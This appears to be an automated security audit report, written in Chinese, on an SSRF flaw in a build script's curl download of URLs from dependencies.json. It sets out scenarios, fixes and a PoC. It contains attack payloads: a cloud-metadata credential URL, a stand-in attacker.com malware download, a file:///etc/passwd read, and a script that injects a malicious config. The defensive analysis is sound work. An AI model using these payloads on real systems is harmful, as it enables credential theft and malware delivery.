# VULN-BUILD-008 深度利用分析报告

## 漏洞概述

| 属性 | 值 |
|------|-----|
| **漏洞 ID** | VULN-BUILD-008 |
| **类型** | SSRF via Malicious URL |
| **CWE** | CWE-918 (Server-Side Request Forgery) |
| **严重性** | Medium (建议降级为 Low) |
| **置信度** | 90 (技术准确性高，但可利用性受限) |
| **文件** | download_dependencies.py |
| **行号** | 101-105 |
| **函数** | proc_artifact |

## 一、漏洞真实性判定

### ✅ 确认为真实漏洞

**理由：**

1. **代码层面存在明确的安全缺陷**：
   - URL 从外部配置文件读取，未经任何验证
   - 使用 `-k` 标志禁用 SSL 证书验证
   - 允许任意协议和重定向

2. **符合 CWE-918 定义**：
   - 应用程序根据用户可控的 URL 获取远程资源
   - 未验证请求目标的安全性

3. **存在实际攻击向量**：
   - 配置文件篡改 → 恶意 URL 注入 → 内部网络探测/恶意文件下载

### ⚠️ 可利用性受限

**限制因素：**

1. **前置条件依赖**：
   - 完全依赖于 VULN-BUILD-004（配置文件缺乏完整性保护）
   - 需要攻击者获得 `dependencies.json` 的写入权限
   - 当前 `artifacts` 数组为空，需添加配置才能激活漏洞

2. **攻击链复杂度**：
   ```
   攻击者获得文件写入权限 
   → 修改 dependencies.json 
   → 添加 artifacts 配置项
   → 注入恶意 URL
   → 等待/诱导开发者运行脚本
   ```

3. **威胁模型适用性**：
   - 这是开发工具，在本地环境运行
   - 攻击者若已获得本地文件写入权限，SSRF 的边际收益有限

## 二、代码流程深度分析

### 2.1 数据流追踪

```python
# Line 47: 配置文件加载（无完整性验证）
self.config = json.loads((self.root / "dependencies.json").read_text())

# Line 137: 提取 artifact_spec
spec = self.config.get("artifact_spec", {})

# Line 139-140: 检查 artifacts 是否非空
if artifacts:  # 当前为空数组 []
    self.proc_artifact(artifacts, spec)

# Line 101: 从配置提取 URL（无验证）
url, sha = spec[name]["url"], spec[name].get("sha256")

# Line 104-105: 执行 curl 命令（绕过 SSL 验证）
self._exec_shell_cmd(["curl", "-Lfk", "--retry", "5", "--retry-delay", "2",
                      "-o", str(archive_path), url])
```

### 2.2 curl 参数安全分析

| 参数 | 含义 | 安全风险 |
|------|------|---------|
| `-L` | 跟随重定向 | ⚠️ 允许攻击者通过重定向绕过初始 URL 检查 |
| `-f` | HTTP 错误时失败 | ✅ 有一定保护作用 |
| `-k` | 绕过 SSL 验证 | 🔴 **高风险**：允许中间人攻击，无法验证服务器身份 |
| `--retry 5` | 重试 5 次 | ⚠️ 增加攻击窗口期 |

### 2.3 URL 验证缺失

**当前代码无任何验证：**
- ✗ 不验证 URL 协议（允许 file://, ftp://, gopher:// 等）
- ✗ 不验证域名白名单
- ✗ 不验证 IP 地址范围（可访问内网 192.168.x.x, 10.x.x.x, 169.254.x.x）
- ✗ 不验证端口范围
- ✗ 不验证 URL 格式

## 三、具体利用场景

### 场景 1：SSRF 攻击 - 云元数据泄露

**攻击步骤：**

1. 攻击者获得 `dependencies.json` 写入权限（通过 VULN-BUILD-004 或其他方式）

2. 修改配置文件：
   ```json
   {
     "artifact_spec": {
       "malicious-pkg": {
         "url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
         "path": "thirdparty/fake"
       }
     },
     "dependency_sets": {
       "prod": {
         "artifacts": ["malicious-pkg"]
       }
     }
   }
   ```

3. 开发者运行：`python3 download_dependencies.py`

4. **结果**：AWS IAM 凭证被下载并保存到本地，可能被后续日志记录或进一步利用

**限制因素：**
- 需要环境运行在云平台（AWS/GCP/Azure）
- 需要元数据服务可访问
- 下载的文件可能不是有效归档，导致解压失败（但数据已被记录）

### 场景 2：恶意软件分发

**攻击步骤：**

1. 篡改配置文件，指向恶意服务器：
   ```json
   {
     "artifact_spec": {
       "backdoor-pkg": {
         "url": "https://attacker.com/malware.tar.gz",
         "sha256": "<恶意文件的哈希>",
         "path": "thirdparty/backdoor"
       }
     }
   }
   ```

2. 开发者运行下载脚本

3. **结果**：恶意代码被下载、解压、放置到项目中

**实际影响：**
- 恶意代码可能被提交到代码仓库
- 恶意代码可能在后续构建过程中被执行
- 开发环境被污染

### 场景 3：内部网络探测

**攻击步骤：**

1. 注入内网 URL：
   ```json
   {
     "artifact_spec": {
       "scan-target": {
         "url": "http://internal-server:8080/admin",
         "path": "temp/scan"
       }
     }
   }
   ```

2. 观察脚本输出或错误信息

3. **结果**：探测内网服务存活状态、端口开放情况

### 场景 4：协议走私攻击

**利用非 HTTP 协议：**

```json
{
  "artifact_spec": {
    "file-exfil": {
      "url": "file:///etc/passwd",
      "path": "temp/exfil"
    }
  }
}
```

**结果**：尝试读取本地敏感文件（取决于 curl 版本和配置）

## 四、前提条件分析

### 4.1 必需前提条件

| 条件 | 可行性评估 |
|------|-----------|
| 获得文件写入权限 | ⚠️ 需要本地账户 + 组成员身份 |
| 修改 `artifacts` 配置 | ✅ JSON 格式，易于修改 |
| 注入恶意 URL | ✅ 无验证，直接注入 |
| 诱导开发者运行脚本 | ⚠️ 取决于开发流程 |

### 4.2 当前缓解因素

1. **配置文件状态**：
   ```json
   {
     "artifact_spec": {},  // 空对象
     "dependency_sets": {
       "prod": { "artifacts": [] },  // 空数组
       "test": { "artifacts": [] }
     }
   }
   ```
   - 功能未激活，需要攻击者添加配置项

2. **文件权限**：
   ```bash
   -rw-rw-r-- 1 pwn20tty pwn20tty 359 Apr 21 01:16 dependencies.json
   ```
   - 权限 664：组可写，但需要本地账户

3. **项目类型**：
   - SDK/库项目，开发工具脚本
   - 攻击面主要在开发环境

### 4.3 与 VULN-BUILD-004 的关系

**VULN-BUILD-004 详情：**
- 类型：配置文件缺乏完整性保护
- 状态：POSSIBLE
- 置信度：50
- 描述：`dependencies.json` 无签名/校验和验证

**链式攻击关系：**
```
VULN-BUILD-004 (配置文件篡改)
    ↓
VULN-BUILD-008 (SSRF 利用)
    ↓
VULN-BUILD-007 (恶意归档解压) [可能]
```

**评估：**
- VULN-BUILD-008 是 VULN-BUILD-004 的**具体利用向量**
- 两者应作为一个攻击链整体评估
- VULN-BUILD-008 单独存在的威胁较低

## 五、实际风险评估

### 5.1 CVSS v3.1 评分

**向量字符串**（假设已有文件写入权限）：
```
CVSS:3.1/AV:L/AC:L/PR:L/UI:R/S:U/C:L/I:L/A:N
```

**评分细分：**
- **攻击向量 (AV)**: Local - 需要本地访问
- **攻击复杂度 (AC)**: Low - 只需修改 JSON 文件
- **权限要求 (PR)**: Low - 需要文件写入权限
- **用户交互 (UI)**: Required - 需要开发者运行脚本
- **影响范围 (S)**: Unchanged - 限于当前项目
- **机密性影响 (C)**: Low - 可探测内网，泄露元数据
- **完整性影响 (I)**: Low - 可注入恶意文件
- **可用性影响 (A)**: None - 无直接影响

**基础分数**: 4.0 (Medium)
**临时分数**: 3.2 (Low) - 考虑前置条件

### 5.2 风险等级建议

**建议从 Medium 降级为 Low**

**理由：**
1. 完全依赖于前置漏洞（配置文件篡改）
2. 当前配置功能未激活
3. 攻击者已有本地文件写入权限时，SSRF 的边际收益有限
4. 攻击链长，需要多个前提条件同时满足

## 六、缓解措施建议

### 6.1 立即修复（高优先级）

**1. 移除 `-k` 标志，启用 SSL 验证**

```python
# 当前代码（不安全）
self._exec_shell_cmd(["curl", "-Lfk", "-o", str(archive_path), url])

# 修复后
self._exec_shell_cmd(["curl", "-Lf", "-o", str(archive_path), url])
```

**理由：**
- `-k` 标志是明确的坏实践
- 允许中间人攻击，破坏传输安全

**2. 添加 URL 白名单验证**

```python
import urllib.parse
from urllib.parse import urlparse

ALLOWED_DOMAINS = [
    'github.com',
    'repo.huawei.com',
    'mirrors.huawei.com',
    # 添加其他受信任的域名
]

def validate_url(url):
    """验证 URL 是否在白名单中"""
    try:
        parsed = urlparse(url)
        
        # 限制协议
        if parsed.scheme not in ['https']:
            raise ValueError(f"不支持的协议: {parsed.scheme}")
        
        # 验证域名
        if parsed.hostname not in ALLOWED_DOMAINS:
            raise ValueError(f"域名不在白名单中: {parsed.hostname}")
        
        # 禁止私有 IP 地址
        if is_private_ip(parsed.hostname):
            raise ValueError(f"禁止访问私有 IP: {parsed.hostname}")
        
        return url
    except Exception as e:
        raise ValueError(f"无效的 URL: {url}, 错误: {e}")

def is_private_ip(hostname):
    """检查是否为私有 IP 地址"""
    import ipaddress
    try:
        ip = ipaddress.ip_address(hostname)
        return ip.is_private or ip.is_loopback or ip.is_link_local
    except:
        return False  # 不是 IP 地址，可能是域名
```

**使用示例：**

```python
# 在 proc_artifact 函数中
url, sha = spec[name]["url"], spec[name].get("sha256")
url = validate_url(url)  # 添加验证
self._exec_shell_cmd(["curl", "-Lf", "-o", str(archive_path), url])
```

### 6.2 长期改进（中优先级）

**1. 配置文件完整性保护**

```python
import hashlib

def load_config_with_integrity():
    """加载配置文件并验证完整性"""
    config_path = self.root / "dependencies.json"
    expected_hash = get_expected_hash()  # 从安全位置获取预期哈希
    
    content = config_path.read_text()
    actual_hash = hashlib.sha256(content.encode()).hexdigest()
    
    if actual_hash != expected_hash:
        raise SecurityError("配置文件完整性验证失败")
    
    return json.loads(content)
```

**2. 使用安全下载库**

考虑使用 Python 内置库替代 curl 命令：

```python
import urllib.request
import ssl

def secure_download(url, output_path, expected_sha256=None):
    """安全的文件下载"""
    # 验证 URL
    validate_url(url)
    
    # 创建 SSL 上下文（强制验证）
    ssl_context = ssl.create_default_context()
    ssl_context.check_hostname = True
    ssl_context.verify_mode = ssl.CERT_REQUIRED
    
    # 下载文件
    with urllib.request.urlopen(url, context=ssl_context) as response:
        data = response.read()
        
        # 验证哈希
        if expected_sha256:
            actual_hash = hashlib.sha256(data).hexdigest()
            if actual_hash != expected_sha256:
                raise ValueError("文件哈希不匹配")
        
        # 写入文件
        output_path.write_bytes(data)
```

**3. 审计日志**

```python
def proc_artifact(self, artifacts, spec):
    """添加审计日志"""
    for name in artifacts:
        url = spec[name]["url"]
        
        # 记录下载请求
        logging.info(f"Artifact download: {name} from {url}")
        logging.info(f"Initiated by: {os.getenv('USER', 'unknown')}")
        logging.info(f"Timestamp: {datetime.now().isoformat()}")
        
        # 验证并下载
        validated_url = validate_url(url)
        secure_download(validated_url, archive_path, sha)
```

## 七、验证测试

### 7.1 概念验证（PoC）

**测试脚本：**

```python
#!/usr/bin/env python3
"""VULN-BUILD-008 SSRF 概念验证"""
import json
import tempfile
from pathlib import Path

# 创建恶意配置
malicious_config = {
    "version": "1.0",
    "artifact_spec": {
        "test-artifact": {
            "url": "http://169.254.169.254/latest/meta-data/",  # AWS 元数据
            "sha256": None,
            "path": "/tmp/test"
        }
    },
    "dependency_sets": {
        "prod": {
            "submodules": [],
            "artifacts": ["test-artifact"]
        },
        "test": {
            "submodules": [],
            "artifacts": []
        }
    }
}

# 写入恶意配置
with open("dependencies.json", "w") as f:
    json.dump(malicious_config, f, indent=2)

print("恶意配置已注入")
print("运行 'python3 download_dependencies.py' 触发 SSRF")
```

### 7.2 预期结果

**无修复时：**
```
✓ curl 尝试访问 http://169.254.169.254/latest/meta-data/
✓ 如果在 AWS 环境，元数据将被下载
✓ 文件保存到 /tmp/test
✗ 无 SSL 验证警告
✗ 无 URL 验证警告
```

**修复后：**
```
✗ URL 验证失败：域名不在白名单中
✗ 或：禁止访问私有 IP
✓ 下载被阻止
✓ 记录审计日志
```

## 八、结论

### 漏洞状态判定

| 维度 | 评估 |
|------|------|
| **真实性** | ✅ 真实漏洞 - 代码存在明确的安全缺陷 |
| **可利用性** | ⚠️ 受限 - 需要前置条件（文件篡改 + 配置激活） |
| **严重性** | Low - 建议从 Medium 降级 |
| **优先级** | 中 - 应修复但不阻塞发布 |

### 与关联漏洞的关系

**攻击链视图：**

```
┌─────────────────────────────────────┐
│ VULN-BUILD-004 (前置条件)           │
│ 配置文件缺乏完整性保护              │
│ 状态: POSSIBLE | 置信度: 50         │
└──────────────┬──────────────────────┘
               │
               ▼
┌─────────────────────────────────────┐
│ VULN-BUILD-008 (本漏洞)             │
│ SSRF via Malicious URL              │
│ 状态: CONFIRMED | 置信度: 90        │
└──────────────┬──────────────────────┘
               │
               ▼
┌─────────────────────────────────────┐
│ VULN-BUILD-007 (可能的后续攻击)     │
│ Path Traversal in Archive Extraction│
│ 状态: LIKELY | 置信度: 85           │
└─────────────────────────────────────┘
```

**建议处理方式：**
1. 保留 VULN-BUILD-008 作为独立漏洞报告
2. 在报告中明确标注依赖关系和前置条件
3. 降低严重性评级或添加利用难度说明
4. 作为攻击链的一部分进行整体评估

### 最终建议

**立即行动：**
1. ✅ 移除 `-k` 标志，启用 SSL 验证
2. ✅ 实现 URL 白名单验证
3. ✅ 添加审计日志

**中期改进：**
4. 🔶 实现配置文件完整性验证
5. 🔶 使用安全的下载库（urllib + SSL 验证）

**长期规划：**
6. 📋 建立依赖安全审计流程
7. 📋 实现依赖来源签名验证

---

**报告生成时间**: 2026-04-21  
**分析人员**: details-worker  
**审核状态**: 待审核
